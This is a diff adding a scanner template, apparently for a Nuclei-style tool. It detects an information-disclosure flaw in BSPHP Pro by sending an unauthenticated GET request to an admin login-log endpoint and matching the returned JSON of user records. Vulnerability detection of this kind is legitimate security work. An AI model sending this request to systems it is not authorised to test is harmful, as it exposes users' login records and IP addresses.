@@ -1,0 +1,31 @@
+id: bsphp-info
+brief:
+    title: BSPHP - Information Disclosure
+    by: ritikchaddha
+    level: low
+    about: Information disclosure in BSPHP Pro causing user and unauth IP disclosure.
+    label:
+        - bsphp
+        - info
+        - disclosure
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0'
+      signs:
+        - "on": word
+          has:
+            - '{"data":'
+            - '"id"'
+            - '"user"'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
